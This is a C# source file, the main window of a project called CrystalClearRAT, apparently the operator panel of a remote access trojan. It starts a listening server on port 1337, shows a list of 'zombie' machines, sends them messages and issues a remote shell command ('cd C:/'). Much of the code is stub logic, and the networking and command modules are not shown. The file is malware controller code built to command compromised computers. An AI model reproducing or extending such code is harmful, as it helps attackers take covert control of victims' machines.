using CrystalClearRAT.Functions;
using CrystalClearRAT.Web;
using CrystalClearRAT.ZombieModel;
using CrystalRATShared.Commands;
using CrystalRATShared.Serialization;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Contexts;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace CrystalClearRAT
{
    /// <summary>
    /// Logika interakcji dla klasy MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            zombieListView.ItemsSource = Zombie.Zombies;
        }

        private void Grid_Loaded(object sender, RoutedEventArgs e)
        {
            Server.Start(1337);

            CommandDataSerializer.Deserialize(RemoteCMD.Command("cd C:/"), (flag, reader) => {

                Console.WriteLine(flag.ToString());
                Console.WriteLine(reader.ReadString());
            });





            // Thread.Sleep(10);

        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            Server.Send(Encoding.UTF8.GetBytes("Hello Zombie"), Zombie.Zombies[0]);
        }

        private void OnMouseRightButtonDown(object sender, MouseButtonEventArgs e)

        {
            ListViewItem item = (ListViewItem)sender;

            ContextMenu menu = (ContextMenu)item.FindResource("zombieContextMenu");

            var zombie = ((ListViewItem)sender).Content as Zombie;

            menu.PlacementTarget = item;
            menu.IsOpen = true;

            //  Console.WriteLine(zombie.IP);
        }

        private void RemoteCMDItem_Click(object sender, RoutedEventArgs e)
        {
            Console.WriteLine(GetZombieFromMenuItem(sender).IP);

        }

        private static Zombie GetZombieFromMenuItem(object menuItem)
        {
            return (((menuItem as MenuItem).Parent as ContextMenu).PlacementTarget as ListViewItem).Content as Zombie;
        }
    }
}
